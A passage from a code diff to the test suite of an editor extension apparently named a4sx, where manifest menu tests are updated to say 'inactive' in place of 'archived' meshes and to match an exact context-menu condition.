     assert.strictEqual(calls.terminals.length, 0);
     assert.strictEqual(calls.errors.length, 0);
@@ -846,8 +1046,9 @@ describe("meshes: manifest", () => {
     }
     const items = pkg.contributes.menus["view/item/context"].filter((m: any) => m.when.startsWith("view == a4sx.meshes"));
     assert.ok(items.filter((m: any) => m.command === ext.CMD_START_IN_MESH).every((m: any) => m.when === "view == a4sx.meshes && viewItem == a4sx.mesh"),
-      "no Start on an archived mesh");
-    assert.ok(items.some((m: any) => m.command === ext.CMD_OPEN_MESH && /a4sx\\\.mesh\(\\\.archived\)\?/.test(m.when)), "Open in browser on archived ones too");
+      "no Start on an inactive mesh");
+    assert.ok(items.some((m: any) => m.command === ext.CMD_OPEN_MESH && m.when === "view == a4sx.meshes && viewItem =~ /^a4sx\\.mesh(\\.inactive)?$/"),
+      "Open in browser on inactive ones too");
   });
 
   it("user-facing strings say a4sx only", () => {
